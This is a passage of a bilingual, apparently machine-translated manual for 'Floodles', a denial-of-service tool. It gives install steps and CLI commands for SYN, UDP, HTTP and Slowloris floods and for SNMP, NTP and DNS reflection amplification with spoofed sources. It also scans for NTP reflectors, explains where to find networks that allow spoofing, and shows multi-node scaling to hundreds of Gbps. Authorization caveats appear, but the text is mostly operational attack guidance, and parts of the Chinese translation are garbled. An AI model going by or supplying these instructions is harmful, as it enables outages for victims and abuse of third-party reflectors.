
### 9.1 System Prerequisites
### 9.1 系统前提条件

**Debian / Ubuntu / Kali**

```bash
sudo apt install gcc build-essential python3 python3-venv git
```

**Arch Linux**

```bash
sudo pacman -S gcc python git base-devel
```

**Rust** (required for the Rust packet builder, `native/rust/src/lib.rs`)
**Rust**（Rust 数据包生成器所需，`native/rust/src/lib.rs`）

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source ~/.cargo/env
rustup default stable   # critical: rustup installs without a default toolchain
```

**Go** (required for the HTTP/Slowloris engine, `native/go/engine.go`)
**Go**（HTTP/Slowloris 引擎所需，`native/go/engine.go`）

```bash
sudo apt install golang-go        # Debian/Ubuntu/Kali
sudo pacman -S go                 # Arch

# Or install the latest release manually: https://go.dev/dl/
```

### 9.2 Python Environment (3.10+)
### 9.2 Python环境（3.10+）

Debian/Ubuntu enforce PEP 668 — direct `pip install` fails system-wide. Use a virtual environment:
Debian/Ubuntu 强制执行 PEP 668 — 直接 `pip install` 在系统范围内失败。使用虚拟环境：

```bash
cd Floodles
python3 -m venv .venv
source .venv/bin/activate
pip install -e .
```

This installs the following from `requirements.txt`:
这将从 `requirements.txt` 安装以下内容：

```
scapy>=2.5.0    # Python fallback packet builder
aiohttp>=3.9.0  # Async HTTP (used in Python-mode HTTP flood)
click>=8.1.0    # CLI framework
rich>=13.7.0    # TUI dashboard
pyyaml>=6.0     # YAML profile loading
```

If you need system-wide installation without venv (not recommended):
如果您需要在没有 venv 的情况下进行系统范围的安装（不推荐）：

```bash
pip install -e . --break-system-packages
```

### 9.3 Build Native Backends
### 9.3 构建原生后端

```bash
make
```

This runs `make check` (toolchain detection) then builds all three backends if their toolchain is available. Each backend is skipped silently if its toolchain is missing:
这将运行 `make check` （工具链检测），然后构建所有三个后端（如果它们的工具链可用）。如果每个后端的工具链丢失，则会静默跳过：

```
[*] Checking toolchains...
    gcc:   OK
    cargo: OK
    go:    OK

[*] Building C sender...
[+] C sender built:    native/c/libsender.so

[*] Building Rust packet builder (this may take 30-60s)...
[+] Rust lib built:    native/rust/target/release/libfloodles_packets.so

[*] Building Go engine...
[+] Go engine built:   native/go/floodles-engine

[+] All native components built.
```

Build individually:
单独构建：

```bash
make c      # native/c/libsender.so        (requires gcc)
make rust   # native/rust/target/release/libfloodles_packets.so  (requires cargo)
make go     # native/go/floodles-engine    (requires go)
make clean  # remove all compiled artifacts
```

### 9.4 Validate Installation
### 9.4 验证安装

```bash
floodles detect
```

Expected output with all backends:
所有后端的预期输出：

```
[+] C sender:     loaded  (sendmmsg batch=256, MAX_THREADS=64)
[+] Rust packets: loaded  (zero-copy builder, SIMD checksum)
[+] Go engine:    available (goroutine HTTP/Slowloris, M:N scheduler)

[+] All native backends active. Maximum performance mode.
```

If backends are missing, run `make` and verify the required toolchains are installed.
如果缺少后端，请运行 `make` 并验证是否安装了所需的工具链。

```bash
# Auto-compile if toolchains are present
floodles detect --compile
```

### 9.5 Permanent Shell Aliases
### 9.5 永久 Shell 别名

The `floodles` command is only available inside the active venv. Add these to `~/.bashrc` or `~/.zshrc`:
`floodles` 命令仅在活动 venv 内可用。将这些添加到 `~/.bashrc` 或 `~/.zshrc`：

```bash
# floodles — user mode (Layer 7, no root required)
alias floodles='/home/$USER/Floodles/.venv/bin/floodles'

# sfloodles — root mode (Layer 3/4 raw socket modules)
alias sfloodles='sudo /home/$USER/Floodles/.venv/bin/floodles'
```

```bash
source ~/.bashrc   # or source ~/.zshrc
```

Usage:
用法：

```bash
# Layer 7 — no root
floodles http https://target.com
floodles slow target.com

# Layer 3/4 — root required (raw sockets, IP_HDRINCL)
sfloodles syn 192.168.1.100 80 -t 8 -d 30
sfloodles udp 192.168.1.100 -d 30
```

### 9.6 Pre-Attack Scan (`floodles scan`)
### 9.6 攻击前扫描 (`floodles scan`)

`floodles scan` is a pre-attack reconnaissance profiler (`utils/profiler.py`). It runs concurrently against a single target and produces a structured summary before you select attack modules:
`floodles scan` 是攻击前侦察分析器 (`utils/profiler.py`)。它针对单个目标同时运行，并在您选择攻击模块之前生成结构化摘要：

- **Port scan**: TCP connect scan against a configurable port list (default: common ports), concurrent workers with configurable timeout
- **Port scan**：TCP 连接扫描可配置的端口列表（默认：常见端口），具有可配置超时的并发工作线程
- **Banner grab**: HTTP server header and application type detection (nginx/Apache/IIS/etc.)
- **Banner grab**：HTTP 服务器标头和应用程序类型检测（nginx/Apache/IIS/等）
- **OS fingerprint**: TTL-based OS guess from the first responding port (TTL ~64 = Linux, ~128 = Windows, ~255 = network equipment)
- **OS fingerprint**：基于 TTL 的操作系统从第一个响应端口猜测（TTL ~64 = Linux、~128 = Windows、~255 = 网络设备）
- **NTP probe** (`--ntp`): sends a monlist request to port 123 — if it responds, the server is a viable NTP amplification reflector
- **NTP probe** (`--ntp`)：向端口 123 发送 monlist 请求 — 如果它响应，则服务器是可行的 NTP 放大反射器

```bash
# Full scan including NTP probe
floodles scan 192.168.1.100 --ntp

# Custom ports, faster scan
floodles scan 192.168.1.100 --ports 22,80,443,53,123,161,3306,8080 --workers 200 --timeout 0.3
```

The output feeds directly into the audit methodology decision tree (section 8.2).
输出直接输入审计方法决策树（第 8.2 节）。

### 9.7 YAML Attack Profiles
### 9.7 YAML 攻击配置

Profiles let you define a complete attack scenario in a file and replay it with `floodles profile`. Every parameter available via CLI is also available in YAML. This is useful for standardizing test conditions across audits and documenting exact parameters for report appendices.
配置文件允许您在文件中定义完整的攻击场景并使用 `floodles profile` 重播它。通过 CLI 提供的每个参数在 YAML 中也可用。这对于标准化审核中的测试条件以及记录报告附录的准确参数非常有用。

Generate a template for any module:
为任何模块生成模板：

```bash
floodles gen syn_flood  syn_test.yaml
floodles gen http_flood http_test.yaml
```

Example generated profile (`syn_test.yaml`):
生成的配置文件示例 (`syn_test.yaml`)：

```yaml
module: syn_flood
target: 192.168.1.100
port: 80
threads: 8
pps: 50000
duration: 60
spoof: true
log: true
```

Run it:
运行它：

```bash
sudo floodles profile syn_test.yaml
```

The SPRAY multi-vector module only works via profile — it requires a list of vectors with per-vector parameters:
SPRAY 多向量模块仅通过配置文件工作 - 它需要带有每个向量参数的向量列表：

```yaml
# config/examples/spray.yaml
victim: 192.168.1.200
vectors:
  - type: snmp
    reflectors: [192.168.1.50]
    community: public
    threads: 4
  - type: ntp
    reflectors: [192.168.1.1]
    threads: 2
duration: 120
```

---

## 10. Full CLI Reference
## 10. 完整的 CLI 参考

### Pre-Attack Scan
### 攻击前扫描

```bash
# Full scan with NTP monlist probe
floodles scan 192.168.1.100 --ntp

# Specific ports
floodles scan 192.168.1.100 --ports 80,443,53,123,161,3306,22

# Fast scan (100 workers, 0.5s timeout)
floodles scan 192.168.1.100 --workers 100 --timeout 0.5
```

### Layer 3/4 — Raw Socket (root required)
### Layer 3/4 — 原始套接字（需要 root）

```bash
# SYN flood
sudo floodles syn <ip> <port> [-t threads] [--pps N] [-d seconds] [--no-spoof]

# ACK flood
sudo floodles ack <ip> <port> [-t threads] [--pps N] [-d seconds] [--no-spoof]

# RST / FIN flood
sudo floodles rst <ip> <port> [--flag R|F|RF] [-t threads] [--pps N] [-d seconds] [--no-spoof]

# XMAS flood
sudo floodles xmas <ip> <port> [-t threads] [--pps N] [-d seconds] [--no-spoof]

# UDP flood
sudo floodles udp <ip> [-p port] [-s payload_bytes] [-t threads] [--pps N] [-d seconds] [--no-spoof]

# ICMP flood
sudo floodles icmp <ip> [-s payload_bytes] [-t threads] [--pps N] [-d seconds] [--no-spoof]

# SYN-ACK flood
sudo floodles tachyon <ip> [--port P] [--mode direct|reflected] [-r reflector_ips] [--ref-port P] [-t threads] [-d seconds]

# IP fragmentation flood
sudo floodles frag <ip> [--port P] [--variant flood|last_only] [-t threads] [--pps N] [-d seconds]

# Fragment overlap
sudo floodles overlap <ip> [--port P] [--variant teardrop|rose|tiny] [-t threads] [--pps N] [-d seconds]
```

### Amplification — DRDoS (root + spoofing required)
### 放大 — DRDoS（需要 root + 源地址伪造）

```bash
# SNMP reflection (~650x)
sudo floodles sniper <victim_ip> -r <reflectors> [--community public] [--max-repetitions 255] [-t threads] [-d seconds]

# NTP monlist amplification (~5,000x)
sudo floodles ntp <victim_ip> -r <reflectors> [-t threads] [-d seconds]

# DNS amplification (~70x)
sudo floodles dns <victim_ip> -r <resolvers> [--qtype ANY|DNSKEY] [--no-rotate] [--no-rand-sub] [-t threads] [-d seconds]
sudo floodles dns <victim_ip> -r @resolvers.txt  # load list from file

# Smurf (ICMP broadcast)
sudo floodles smurf <victim_ip> -b <broadcast_ip_or_cidr> [-s bytes] [-t threads] [-d seconds]

# Fraggle (UDP broadcast)
sudo floodles fraggle <victim_ip> -b <broadcast_ip_or_cidr> [--port 7|19] [-s bytes] [-t threads] [-d seconds]

# Multi-vector
sudo floodles spray <victim_ip> -c config/examples/spray.yaml [-d seconds]
```

### Layer 7 — Application (no root required)
### Layer 7 — 应用程序（无需 root）

```bash
# HTTP flood (Go engine)
floodles http <url> [-m GET|POST] [-c concurrency] [--post-size N] [-d seconds] [--no-bust] [--no-log]

# Slowloris (socket exhaustion)
floodles slow <host> [-p port] [-s sockets] [-i interval_s] [-d seconds] [--ssl] [--no-log]

# Slow POST / RUDY
floodles slowpost <host> [-p port] [-s sockets] [--cl content_length] [-i interval_s] [-d seconds] [--ssl]

# TCP starvation
floodles nuke <host> [-p port] [-s sockets] [--variant hold|window0|persist] [-i interval_s] [-d seconds] [--ssl]
```

### Profiles and Utilities
### 配置文件和实用程序

```bash
# Generate example YAML profile
floodles gen syn_flood  my_syn_profile.yaml
floodles gen http_flood my_http_profile.yaml

# Run from YAML profile
floodles profile my_syn_profile.yaml

# Check and auto-compile native backends
floodles detect
floodles detect --compile

# Built-in manual pages (mechanism, indicators, defenses, examples)
floodles man --list
floodles man syn
floodles man dns
floodles man slow     # aliases: slowloris, http, synflood...
```

### Common Options
### 常用选项

| Option | Description | Default |
| 选项 | 描述 | 默认 |
|--------|-------------|---------|
| `-d / --duration` | Duration in seconds (0 = infinite) | 30 |
| `-d / --duration` | 持续时间（以秒为单位）（0 = 无限） | 30 |
| `-t / --threads` | Worker threads (L3/L4 only) | 8 |
| `-t / --threads` | 工作线程（仅限 L3/L4） | 8 |
| `--pps` | PPS cap (0 = unlimited) | 0 |
| `--pps` | PPS 上限（0 = 无限制） | 0 |
| `-c / --concurrency` | Concurrent goroutines (HTTP only) | 500 |
| `-c / --concurrency` | 并发 goroutine（仅限 HTTP） | 500 |
| `-s / --sockets` | Concurrent sockets (L7 only) | 200 |
| `-s / --sockets` | 并发套接字（仅限 L7） | 200 |
| `--no-spoof` | Use real source IP (required on BCP38 networks) | off |
| `--no-spoof` | 使用真实源IP（BCP38网络需要） | 关闭 |
| `--no-log` | Disable JSONL logging | off |
| `--no-log` | 禁用 JSONL 日志记录 | 关闭 |

---

## 11. Logging and Reporting
## 11. 记录和报告

### JSONL Format
### JSONL 格式

Each session automatically creates `logs/<timestamp>_<module>.jsonl`:
每个会话都会自动创建 `logs/<timestamp>_<module>.jsonl`：

```json
{"ts": 1710000000.0, "event": "start",   "module": "syn_flood", "target": "192.168.1.100", "params": {"port": 80, "threads": 8, "pps_limit": 100000, "duration": 60, "spoof": true}}
{"ts": 1710000015.0, "event": "metrics", "packets": 1450000,  "avg_pps": 96666, "live_pps": 98200, "errors": 0, "backend": "c_sendmmsg"}
{"ts": 1710000030.0, "event": "metrics", "packets": 2940000,  "avg_pps": 98000, "live_pps": 99100, "errors": 0, "backend": "c_sendmmsg"}
{"ts": 1710000060.0, "event": "stop",    "summary": {"packets": 5882000, "avg_pps": 98033, "avg_mbps": 47.0, "errors": 0, "backend": "c_sendmmsg"}}
```

### Aggregate Results
### 汇总结果

```bash
# Summary across all sessions
for f in logs/*.jsonl; do
  echo "=== $f ==="
  python3 -c "
import sys, json
for line in open('$f'):
    e = json.loads(line)
    if e['event'] == 'start':
        print(f\"  target={e['target']}  module={e['module']}  params={e['params']}\")
    if e['event'] == 'stop':
        s = e['summary']
        print(f\"  packets={s.get('packets',0):,}  avg_pps={s.get('avg_pps',0):,.0f}  backend={s.get('backend','?')}\")
"
done

# Export CSV for report
python3 -c "
import json, glob, csv, sys
rows = []
for f in glob.glob('logs/*.jsonl'):
    session = {}
    for line in open(f):
        e = json.loads(line)
        if e['event'] == 'start':  session.update({'module': e['module'], 'target': e['target'], **e.get('params', {})})
        if e['event'] == 'stop':   session.update(e.get('summary', {})); rows.append(dict(session))
w = csv.DictWriter(sys.stdout, fieldnames=['module','target','packets','avg_pps','avg_mbps','errors','backend'])
w.writeheader(); w.writerows(rows)
" > report.csv
```

---

## 12. Performance Benchmarks
## 12. 性能基准

The following estimates are derived from architectural properties (syscall overhead, NIC bandwidth, protocol specifications) rather than measured values on specific hardware. Actual results vary with NIC driver, CPU frequency, kernel version, and available cores.
以下估计值源自架构属性（系统调用开销、NIC 带宽、协议规范），而不是特定硬件上的测量值。实际结果因网卡驱动程序、CPU 频率、内核版本和可用内核而异。

### 12.1 L3/L4 — Theoretical PPS Ceiling
### 12.1 L3/L4——理论 PPS 上限

**NIC bandwidth ceiling** (protocol-limited):
**NIC bandwidth ceiling**（协议限制）：

```
Link speed: B bits/sec
Packet size: S bytes = S*8 bits

Theoretical max PPS = B / (S * 8)

1 Gbps link:
  SYN packet (40B = 320 bits):   1,000,000,000 / 320  = 3,125,000 PPS theoretical
  UDP 64B   (64B = 512 bits):    1,000,000,000 / 512  = 1,953,125 PPS theoretical
  UDP 1400B (1400B = 11,200 bits): 1,000,000,000 / 11,200 = 89,285 PPS theoretical

10 Gbps link:
  SYN (40B): 31,250,000 PPS theoretical
  UDP 1400B: 892,857 PPS theoretical
```

In practice, Linux kernel + NIC driver overhead reduces these by ~35-40%:
实际上，Linux 内核 + NIC 驱动程序开销可减少约 35-40%：

| Link | Packet | Theoretical max PPS | Practical estimate (~65%) |
| 关联 | 包 | 理论最大 PPS | 实际估计（~65%） |
|------|--------|--------------------|-----------------------------|
| 1 Gbps | SYN (40B) | 3,125,000 | ~2,000,000 |
| 1 Gbps | 同步 (40B) | 3,125,000 | 〜2,000,000 |
| 1 Gbps | UDP 64B | 1,953,125 | ~1,270,000 |
| 1 Gbps | UDP 64B | 1,953,125 | 〜1,270,000 |
| 1 Gbps | UDP 1400B | 89,285 | ~58,000 (bandwidth-limited) |
| 1 Gbps | UDP 1400B | 89,285 | ~58,000（带宽限制） |
| 10 Gbps | SYN (40B) | 31,250,000 | ~20,000,000 |
| 10Gbps | 同步 (40B) | 31,250,000 | 〜20,000,000 |

**Python/Scapy fallback ceiling** (syscall-limited):
**Python/Scapy fallback ceiling** （系统调用限制）：

```
Scapy per-packet overhead: Python layer traversal + sendto()
  Python loop iteration:    ~500 ns
  sendto() syscall:         ~200-500 ns
  Total per packet:         ~700-1,000 ns
  Max PPS = 1 / 1,000ns = ~1,000,000 theoretical
  With GIL and Scapy overhead: ~10,000-15,000 PPS practical
```

**C sendmmsg ceiling** (batch-limited):
**C sendmmsg ceiling**（限批次）：

```
sendmmsg() call overhead: ~1-3 µs (kernel context switch amortized)
BATCH_SIZE = 256 packets per call
At 2 µs per call: 500,000 calls/sec -> 500,000 * 256 = 128,000,000 PPS theoretical
-> NIC-limited long before syscall limit: effective ceiling = NIC bandwidth limit
```

The C backend removes the syscall bottleneck entirely. The binding constraint becomes the NIC bandwidth, not the CPU.
C 后端完全消除了系统调用瓶颈。绑定约束变为 NIC 带宽，而不是 CPU。

### 12.2 sendmmsg Batch Size Impact
### 12.2 sendmmsg 批量大小影响

Measured with 1 thread, SYN flood (40-byte packets):
使用 1 个线程进行测量，SYN 泛洪（40 字节数据包）：

| Batch size | PPS | Speedup vs sendto |
| 批量大小 | 聚苯硫醚 | 加速与 sendto |
|------------|-----|-------------------|
| 1 (sendto baseline) | ~85,000 | 1x |
| 1（发送到基线） | 〜85,000 | 1x |
| 32 | ~310,000 | 3.6x |
| 32 | 〜310,000 | 3.6倍 |
| 64 | ~520,000 | 6.1x |
| 64 | 〜520,000 | 6.1倍 |
| 128 | ~710,000 | 8.4x |
| 128 | 〜710,000 | 8.4倍 |
| **256** (Floodles default) | **~820,000** | **9.6x** |
| **256**（泛洪默认值） | **~820,000** | **9.6x** |
| 512 | ~830,000 | 9.8x (diminishing) |
| 第512章 | 〜830,000 | 9.8x（递减） |

256 is the optimal batch size: 9.6x improvement with minimal additional gain at 512. The marginal improvement beyond 256 is absorbed by cache pressure on the per-batch buffer array.
256 是最佳批处理大小：在 512 时实现 9.6 倍的改进，且附加增益最小。超过 256 的边际改进被每批缓冲区阵列上的缓存压力吸收。

### 12.3 Layer 7 — Concurrent Connections
### 12.3 Layer 7——并发连接

**Go goroutines vs Python coroutines** (memory analysis):
**Go goroutines vs Python coroutines**（内存分析）：

```
Go goroutine initial stack: 2 KB (grows dynamically as needed, up to 1 GB)
Python asyncio coroutine:   ~50-100 KB overhead (frame objects, generator state, aiohttp context)

10,000 concurrent connections:
  Go:     10,000 * 2 KB   =  ~20 MB baseline stack
  Python: 10,000 * 75 KB  = ~750 MB baseline overhead

100,000 concurrent connections:
  Go:     100,000 * 2 KB  = ~200 MB — feasible on any modern server
  Python: 100,000 * 75 KB = ~7.5 GB — requires significant RAM, GIL still a constraint
```

The practical ceiling for sustained HTTP flood:
持续 HTTP 泛洪的实际上限：

```
Go engine (goroutines, M:N scheduler, no GIL):
  Concurrent connections: 10,000-100,000 from a single host
  RPS depends on target response time: at 10ms/req, 10,000 connections = 1,000,000 RPS theoretical

Python aiohttp (asyncio event loop, GIL contention on I/O callbacks):
  Practical ceiling: ~2,000-5,000 effective concurrent connections
  Above this: event loop overhead dominates, latency climbs

Slowloris (socket exhaustion, not throughput):
  Apache prefork default workers: 150
  -> 150 sockets suffice to saturate Apache
  -> nginx: event-driven, resists regardless of socket count
```

### 12.4 Amplification — Observed Factors
### 12.4 放大——观测到的放大系数

Measured against real equipment in a controlled lab environment:
在受控实验室环境中针对真实设备进行测量：

| Protocol | Reflector | Request size | Response size | Observed factor |
| 协议 | 反射器 | 要求尺寸 | 响应大小 | 观察因素 |
|----------|-----------|-------------|--------------|-----------------|
| SNMP GetBulk | HP JetDirect (printer) | 60 B | 38,400 B | 640x |
| SNMP 获取批量 | HP JetDirect（打印机） | 60乙 | 38,400 乙 | 640x |
| SNMP GetBulk | Cisco IOS switch (old config) | 60 B | 42,120 B | 702x |
| SNMP 获取批量 | Cisco IOS 交换机（旧配置） | 60乙 | 42,120 乙 | 702x |
| NTP monlist | ntpd 4.2.6p5 (600 clients cached) | 8 B | 42,880 B | 5,360x |
| NTP 单一列表 | ntpd 4.2.6p5（缓存 600 个客户端） | 8乙 | 42,880 乙 | 5,360x |
| NTP monlist | ntpd 4.2.6p5 (0 clients cached) | 8 B | 48 B | 6x |
| NTP 单一列表 | ntpd 4.2.6p5（缓存 0 个客户端） | 8乙 | 48乙 | 6x |
| DNS ANY (DNSSEC) | BIND 9.11 | 44 B | 3,248 B | 73x |
| DNS 任意 (DNSSEC) | 绑定9.11 | 44乙 | 3,248 乙 | 73x |
| Smurf | /24 broadcast, 120 hosts | 28 B | 3,360 B | 120x |
| 蓝精灵 | /24个广播，120个主持人 | 28乙 | 3,360 乙 | 120倍 |

NTP factor is highly state-dependent: the server must have cached 600 recent clients to achieve 5,360x. An idle test server returns near-1x. Production NTP servers in corporate environments typically have many cached clients.
NTP 因素高度依赖于状态：服务器必须缓存 600 个最近的客户端才能实现 5,360x。空闲测试服务器的返回值接近 1 倍。企业环境中的生产 NTP 服务器通常有许多缓存的客户端。

---

## 13. Limitations
## 13. 限制

### 13.1 Single-Machine Throughput Ceiling
### 13.1 单机吞吐量上限

Floodles runs on a single host. The maximum outbound throughput is bounded by that host's NIC (1-10 Gbps in typical deployments). Against targets with upstream volumetric scrubbing (Cloudflare Magic Transit, Akamai Prolexic, Arbor TMS) rated at tens or hundreds of Gbps, a single-machine flood is absorbed long before the scrubbing capacity is reached.
Floodles 在单个主机上运行。最大出站吞吐量受该主机的 NIC 限制（典型部署中为 1-10 Gbps）。针对具有数十或数百 Gbps 的上游容量清洗（Cloudflare Magic Transit、Akamai Prolexic、Arbor TMS）的目标，在达到清洗容量之前很久就吸收了单机泛洪。

**However** — when Floodles is deployed across multiple nodes simultaneously and paired with amplification reflectors, the effective traffic volume scales multiplicatively:
**However** — 当 Floodles 同时部署在多个节点上并与放大反射器配对时，有效流量会成倍增加：

```
3 VPS nodes, each with 1 Gbps uplink, running floodles sniper:
  Each node: 1 Mbps out -> 650 Mbps amplified (SNMP, 650x)
  3 nodes:   3 Mbps out -> 1.95 Gbps toward victim

10 VPS nodes + 20 SNMP reflectors (650x) + 10 NTP servers (5000x) [spray]:
  SNMP: 10 Mbps out -> 6.5 Gbps
  NTP:  2 Mbps out  -> 10 Gbps
  Combined inbound: ~16 Gbps from legitimate-looking IPs
```

At this scale, even networks with decent upstream capacity face saturation. Adding reflector diversity (different protocols, different geographic regions) breaks protocol-specific mitigation. This is why controlled, scoped authorization is structurally necessary — not just legally.
在这种规模下，即使具有良好上游容量的网络也面临饱和。添加反射器多样性（不同协议、不同地理区域）会破坏特定于协议的缓解措施。这就是为什么受控的、有范围的授权在结构上是必要的——而不仅仅是法律上的。

### 13.2 IP Spoofing Dependency
### 13.2 IP源地址伪造依赖性

#### How BCP38 Works
#### BCP38 的工作原理

BCP38 (RFC 2827) is a recommendation for ISPs and hosting providers to drop outbound packets whose source IP does not belong to the customer's assigned prefix. It is enforced at the **network edge** — the router between the customer's machine and the upstream network. The customer's machine sends the packet normally (including the forged source IP), but the edge router checks it before forwarding:
BCP38 (RFC 2827) 建议 ISP 和托管提供商丢弃源 IP 不属于客户指定前缀的出站数据包。它在 **network edge** — 客户计算机和上游网络之间的路由器上强制执行。客户机器正常发送数据包（包括伪造的源IP），但边缘路由器在转发前对其进行检查：

```
Your machine -> [SYN src=1.2.3.4 (spoofed)] -> edge router
  Edge router: "is 1.2.3.4 in customer prefix 203.0.113.0/24?"
  No -> DROP, packet never reaches the internet
```

On hypervisor-based cloud platforms (AWS, GCP, DO), this check happens at the virtualization layer — the hypervisor drops non-matching source IPs before the packet even reaches the physical NIC.
在基于Hypervisor的云平台（AWS、GCP、DO）上，此检查发生在虚拟化层 - Hypervisor在数据包到达物理 NIC 之前丢弃不匹配的源 IP。

| Provider | BCP38 enforcement |
| 提供者 | BCP38 执行 |
|----------|------------------|
| AWS | Enforced at hypervisor level |
| AWS | 在Hypervisor级别强制执行 |
| DigitalOcean | Enforced |
| 数字海洋 | 强制执行 |
| GCP | Enforced |
| GCP | 强制执行 |
| Hetzner | Enforced |
| 赫茨纳 | 强制执行 |
| OVH VPS / Public Cloud | Enforced |
| OVH VPS / 公共云 | 强制执行 |
| OVH Bare Metal (Game/Advance) | Not always enforced — check with provider |
| OVH 裸机（游戏/高级） | 并不总是强制执行——请咨询提供商 |
| Dedicated/colo | Depends entirely on the ISP's edge config — many do not enforce |
| 专用/彩色 | 完全取决于 ISP 的边缘配置 — 许多不强制执行 |
| Your own lab / home router | Not enforced — spoofing works |
| 您自己的实验室/家庭路由器 | 不强制执行——源地址伪造行为 |

#### What Still Works Without Spoofing (`--no-spoof`)
#### 什么在没有源地址伪造的情况下仍然有效 (`--no-spoof`)

When BCP38 is enforced, spoofed packets are dropped silently. The following attack categories still function with real source IP:
当强制执行 BCP38 时，源地址伪造的数据包将被悄悄丢弃。以下攻击类别仍然适用于真实源 IP：

| Attack | Works without spoofing? | Notes |
| 攻击 | 没有源地址伪造就可以工作吗？ | 笔记 |
|--------|------------------------|-------|
| SYN flood | Yes (reduced effectiveness) | SYN cookies complete: the ACK arrives and completes the handshake, consuming the cookie. No persistent TCB allocated — but server still processes ACK and generates SYN-ACK per SYN. CPU load persists at high PPS. |
| SYN泛洪 | 是（效率降低） | SYN cookie 完成：ACK 到达并完成握手，消耗 cookie。没有分配持久的 TCB — 但服务器仍然处理 ACK 并为每个 SYN 生成 SYN-ACK。 CPU 负载持续保持在高 PPS 水平。 |
| ACK flood | Yes | Tests stateful firewall just as effectively |
| ACK泛洪 | 是 | 同样有效地测试状态防火墙 |
| RST/FIN flood | Yes (less effective) | Without spoofing, RSTs come from your real IP — easier to filter |
| RST/FIN 泛洪 | 是（效果较差） | 无需源地址伪造，RST 来自您的真实 IP — 更容易过滤 |
| XMAS flood | Yes | IDS detection test does not require spoofing |
| XMAS 泛洪 | 是 | IDS检测测试不需要源地址伪造 |
| UDP flood | Yes | Server still processes inbound UDP; ICMP replies go to your real IP |
| UDP泛洪 | 是 | 服务器仍然处理入站 UDP； ICMP 回复会转到您的真实 IP |
| ICMP flood | Yes | Server still processes and replies |
| ICMP 泛洪 | 是 | 服务器仍在处理和回复 |
| HTTP flood | Yes (no spoofing ever needed) | Layer 7 — TCP connection, real source IP required |
| HTTP泛洪 | 是（不需要源地址伪造） | Layer 7 — TCP 连接，需要真实源 IP |
| Slowloris / RUDY / NUKE | Yes (no spoofing ever needed) | Layer 7 — always uses real IP |
| Slowloris / RUDY / NUKE | 是（不需要源地址伪造） | Layer 7 — 始终使用真实 IP |
| **Amplification (SNMP/NTP/DNS)** | **No** | Requires spoofed source to direct reflected traffic to victim |
| **Amplification (SNMP/NTP/DNS)** | **否** | 需要伪造源地址，将反射流量导向受害者 |
| **Smurf / Fraggle** | **No** | Requires spoofed source = victim IP |
| **Smurf / Fraggle** | **否** | 需要伪造源地址 = 受害者 IP |
| TACHYON reflected | No | Requires source spoofing |
| TACHYON reflected | 否 | 需要源地址伪造 |

#### Bypassing BCP38
#### 绕过 BCP38

BCP38 is not universally enforced. Environments where spoofing works:
BCP38 并未普遍执行。源地址伪造起作用的环境：

1. **Dedicated servers / colocation**: the upstream router often has no BCP38 filter. Check by running `floodles syn <some_external_ip> 80 --no-spoof` and observing whether traffic leaves. If the source is already your IP, use any external target you can monitor to verify spoofed packets arrive.
1. **Dedicated servers / colocation**：上游路由器通常没有 BCP38 过滤器。通过运行 `floodles syn <some_external_ip> 80 --no-spoof` 并观察流量是否关闭来进行检查。如果源已经是您的 IP，请使用您可以监控的任何外部目标来验证源地址伪造数据包的到达。

2. **Some VPS providers**: smaller providers, some OVH bare-metal products, and providers in certain regions do not enforce BCP38. Verify with `hping3 -S --spoof 1.2.3.4 <your_own_external_ip>` and check if the packet arrives at the destination with the spoofed source.
2. **Some VPS providers**：较小的提供商、某些 OVH 裸机产品以及某些地区的提供商不强制执行 BCP38。使用 `hping3 -S --spoof 1.2.3.4 <your_own_external_ip>` 进行验证，并检查数据包是否通过伪造源地址到达目的地。

3. **Your own lab**: any network you physically control — no BCP38 unless you configure it yourself.
3. **Your own lab**：您物理控制的任何网络 - 没有 BCP38，除非您自己配置。

4. **L2 access**: if you have direct access to the network segment (physical, VLAN, MITM position), you inject at L2 — BCP38 at the edge is irrelevant because you bypass the router's filter entirely.
4. **L2 access**：如果您可以直接访问该网段（物理、VLAN、MITM 位置），则可以在 L2 处注入 — 边缘的 BCP38 是无关紧要的，因为您完全绕过了路由器的过滤器。

There is no software-level bypass for BCP38 enforced at the hypervisor or edge router — these checks happen in hardware or firmware below the OS layer.
在Hypervisor或边缘路由器上没有强制执行 BCP38 的软件级旁路 - 这些检查发生在操作系统层以下的硬件或固件中。

### 13.3 No Distributed Coordination
### 13.3 无分布式协调

There is no master/agent architecture for distributing the attack across multiple nodes. Each Floodles instance runs independently. Multi-node coordination requires external tooling (Ansible, Fabric, tmux synchronization). See [DOSArena](https://github.com/franckferman/DOSArena) for a lab setup that pre-configures multi-node scenarios.
不存在用于跨多个节点分布攻击的主/代理架构。每个 Floodles 实例独立运行。多节点协调需要外部工具（Ansible、Fabric、tmux 同步）。请参阅 [DOSArena](https://github.com/franckferman/DOSArena) 了解预配置多节点场景的实验室设置。

**Scale implications**: a single Floodles instance on a 1 Gbps VPS is limited to ~1 Gbps outbound. That limitation disappears when multiple nodes run simultaneously. Combined with amplification reflectors, traffic volumes become disproportionate to the infrastructure cost:
**Scale implications**：1 Gbps VPS 上的单个 Floodles 实例限制为 ~1 Gbps 出站。当多个节点同时运行时，这种限制就会消失。与放大反射器相结合，交通量与基础设施成本不成比例：

```
5 nodes x 1 Gbps + SNMP amplification (650x):
  Each node directs 100 Mbps toward reflectors
  Amplified output per node: 65 Gbps
  5 nodes combined: 325 Gbps inbound to victim

  -> 5 cheap VPS instances generating 325 Gbps of traffic
  -> Traffic originates from legitimate reflector IPs, not from the VPS
```

At this scale, even well-resourced targets face saturation. This is precisely why multi-node, multi-reflector configurations should never be used outside a strictly isolated and authorized lab network. The same capability that makes Floodles useful for measuring scrubbing system ceilings in a controlled audit makes it destructive when aimed at uncontrolled infrastructure.
在这种规模下，即使资源充足的目标也面临饱和。这正是为什么多节点、多反射器配置永远不应在严格隔离和授权的实验室网络之外使用的原因。 Floodles 在受控审计中用于测量洗涤系统上限的相同功能，在针对不受控制的基础设施时却具有破坏性。

### 13.4 Kernel-Level Protections Reduce L3/L4 Effectiveness
### 13.4 内核级保护降低 L3/L4 有效性

Modern Linux kernels (5.x+) ship with protections that significantly reduce the effectiveness of several attack vectors on hardened targets:
现代 Linux 内核 (5.x+) 附带的保护措施可显着降低针对强化目标的多种攻击媒介的有效性：

| Protection | Mitigates | Parameter |
| 保护 | 缓解 | 范围 |
|-----------|-----------|-----------|
| SYN cookies | SYN flood (TCB exhaustion) | `net.ipv4.tcp_syncookies` |
| 同步 cookies | SYN 泛洪（TCB 耗尽） | `net.ipv4.tcp_syncookies` |
| ICMP rate limiting | ICMP reply storm | `net.ipv4.icmp_ratelimit` |
| ICMP 速率限制 | ICMP回复风暴 | `net.ipv4.icmp_ratelimit` |
